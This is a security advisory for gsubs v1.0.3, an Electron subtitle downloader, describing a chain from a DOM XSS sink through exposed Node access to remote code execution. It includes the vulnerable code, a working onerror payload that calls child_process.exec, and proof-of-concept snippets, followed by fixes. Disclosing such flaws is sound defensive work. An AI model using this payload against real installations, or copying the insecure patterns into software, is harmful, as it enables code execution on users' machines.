# sanjevirau gsubs v1.0.3 has RCE via DOM XSS in renderer/index.js (CWE-94)

## Vendor
sanjevirau
## Product
gsubs
## Version
1.0.3
## Class
Code Injection (CWE-94) / Cross-Site Scripting (CWE-79)
## CVSS
9.6 Critical (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)

## Vulnerability parameter
renderer/index.js:466,526 — `this.filename` from OpenSubtitles API response, concatenated into DOM without HTML escaping.
main.js:30 — `nodeIntegration: true` (Electron 9, contextIsolation defaults to false).
app/view/index.html:192 — `window.nodeRequire = require` retained globally.

## describe

gsubs is an Electron 9.1.2 desktop application for subtitle downloading. Three defects chain to remote code execution:

1. **renderer runs with Node integration** (`main.js:30-32`): `nodeIntegration: true` with implicit `contextIsolation: false` (Electron 9 default). The renderer has full Node.js access including `child_process`.

2. **nodeRequire globally available** (`app/view/index.html:192`): The developer attempted to restrict Node access by deleting `window.require`, but left `window.nodeRequire = require` globally reachable. Any injected script can call `window.nodeRequire('child_process').exec(...)`.

3. **unescaped DOM sink** (`renderer/index.js:466,526`): Subtitle filenames (`this.filename`) from the OpenSubtitles API response are concatenated into HTML via jQuery `.append()` without any escaping. A filename containing HTML markup is parsed as live DOM nodes.

**Code analysis**

main.js:30-32:
```javascript
mainWindow = new BrowserWindow({
    webPreferences: {
        nodeIntegration: true
        // contextIsolation unset → defaults to false on Electron 9.x
    }
});
```

app/view/index.html:192:
```javascript
window.nodeRequire = require;   // still reachable
delete window.require;          // only window.require removed
```

renderer/index.js:466:
```javascript
var fileName = this.filename;  // from OpenSubtitles API response
$("#result-tbody").append(
    '<tr><td title="' + fileName + '">' + fileName + '</td>...'
);
// fileName not HTML-escaped → injection point
```

renderer/index.js:526 (search box result path):
```javascript
var fileName = this.filename;
$("#result-tbody").append(
    '<tr><td title="' + fileName + '">' + fileName + ' </td>...'
);
```

**Attack chain**

```
Attacker-controlled subtitle filename from API:
  "><img src=x onerror="window.nodeRequire('child_process').exec('calc.exe')">.srt
    ↓
renderer/index.js:466/526: jQuery .append() with unescaped filename
    ↓
DOM parsed: <img src=x onerror="..."> injected into page
    ↓
onerror fires → window.nodeRequire('child_process').exec(...)
    ↓
Arbitrary OS command execution
```

Delivery vectors:
- Primary: Malicious subtitle filename returned by OpenSubtitles-compatible API (user searches a title → API returns crafted result → RCE). AV:N.
- Secondary: On-path MITM attacker alters HTTPS response to api.opensubtitles.org.

## POC

Verified on unmodified gsubs v1.0.3, Windows 11, Electron 9.1.2. Three-layer CDP verification:

**Layer 1 — Node.js capability confirmed**:
```javascript
// Executed in real gsubs renderer via CDP
window.nodeRequire('fs').writeFileSync('E:/.../_POC_B01_MITM_E2E.txt',
    'RCE_OK ' + window.nodeRequire('os').userInfo().username);
// Result: SUCCESS — marker file written with username
```

**Layer 2 — DOM XSS sink confirmed**:
```javascript
// jQuery .append() in real page with XSS payload
$("#result-tbody").append(
    '<tr><td title=""><img src=x onerror="window.nodeRequire(\'child_process\').exec(\'calc.exe\')">.srt">...'
);
// Result: img.onerror fired → calc.exe launched → marker file written
```

**Layer 3 — Full API pipeline confirmed**:
```javascript
// Direct call to real showQuerySuccessPage() with API-shaped mock result
showQuerySuccessPage({"en": [{filename: XSS_PAYLOAD, url: "...", ...}]}, globalToken);
// Result: parse → render → XSS → RCE → marker "XSS_API_SIM_OK WSY"
```

Each layer independently confirmed: `child_process.exec('calc.exe')` launched, marker file written via `fs.writeFileSync()` through `nodeRequire`.

![POC Evidence](https://raw.githubusercontent.com/LeoWSY-hashblue/cve-electron-2/master/gsubs/screenshot/poc_evidence.png)

*POC evidence summary: marker file "RCE_B01_GSUBS uid=WSY" written via window.nodeRequire('fs').writeFileSync(); calc.exe launched via child_process.exec(). CDP triple-layer verification on unmodified gsubs v1.0.3 — all three layers independently confirmed.*

## Fix

1. Upgrade Electron → `nodeIntegration: false`, `contextIsolation: true`
2. Remove `window.nodeRequire` entirely; use `contextBridge` + `preload.js`
3. HTML-escape all external data before DOM insertion (jQuery `.text()` instead of `.append()`)
4. Add Content-Security-Policy: `default-src 'self'; script-src 'self'`
5. Upgrade electron-updater (currently ≤4.0.0, vulnerable to CVE-2020-15138)

## Reference
https://github.com/sanjevirau/gsubs
https://cholaware.com/gsubs
